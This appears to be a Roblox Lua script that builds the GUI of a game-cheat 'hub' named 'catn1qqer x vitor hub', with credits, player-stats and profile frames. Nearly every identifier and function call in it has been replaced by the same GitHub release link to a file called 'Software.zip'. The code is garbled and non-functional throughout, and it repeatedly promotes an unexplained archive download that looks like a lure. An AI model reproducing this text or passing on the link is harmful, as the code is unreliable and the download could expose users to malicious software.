https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0420094579, 0, 0.851550817, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 222, 0, 18)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Fruit :"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Below"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(36, 36, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(36, 36, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.247821882, 0, 0.672384202, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 766, 0, 93)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Below

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "BlockCorner"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Below
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(36, 36, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(36, 36, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-0.000219917798, 0, -0.0050350721, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 766, 0, 83)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Credits1"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Below
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.566378653, 0, 0.412709624, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 315, 0, 21)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "legiteriumz, thuy - coding"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.790
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Credits2"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Below
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.72432071, 0, 0.150882617, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 194, 0, 21)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "thuy - ui design"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.790
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Brand"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.795740545, 0, 0.010291595, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 200, 0, 27)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "catn1qqer x vitor hub"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 17.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.440
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Profile"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.650
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.934172273, 0, 0.0926243663, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 40, 0, 40)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip".. https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip .."&width=420&height=420&format=png"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Profile

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Welcome"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.447241038, 0, 0.475128651, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 200, 0, 30)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Welcome,"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 29.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Username"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.447241038, 0, 0.528997242, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 503, 0, 51)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 48.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Client Uptime"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.447241038, 0, 0.617495716, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 235, 0, 22)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Client Uptime : 00h 00m 00s"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 13.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "RobloxProfile"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.800
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.255566329, 0, 0.327615768, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 190, 0, 190)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip".. https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip .."&width=420&height=420&format=png"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = RobloxProfile

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Tabs"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(36, 36, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.011616651, 0, 0.193825036, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 235, 0, 107)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Tabs

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "ProfileTab"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Tabs
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(71, 120, 116)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0389033705, 0, 0.0712717101, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 40, 0, 40)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "rbxassetid://7992557358"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "PlayerStats"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Tabs
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.255319148, 0, 0.102803737, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 175, 0, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Player Stats"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "ItemsTab"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Tabs
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(71, 120, 116)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0516693145, 0, 0.529215634, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 33, 0, 31)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "rbxassetid://7485051715"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.480
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "ItemsInv"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Tabs
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.255319148, 0, 0.532710314, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 175, 0, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Items (soon)"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.480
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Main"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(85, 165, 175)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.247821882, 0, 0.0668953657, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 766, 0, 445)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "rbxassetid://13412525664"

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Main

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Game"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.255566239, 0, 0.8730703, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 200, 0, 27)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Checking.."
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "CreatorName"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.255566239, 0, 0.902229786, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 200, 0, 27)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Gamer Robot Inc"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 15.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.350
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Logo"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 0, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0199410655, 0, 0.0274442546, 0)
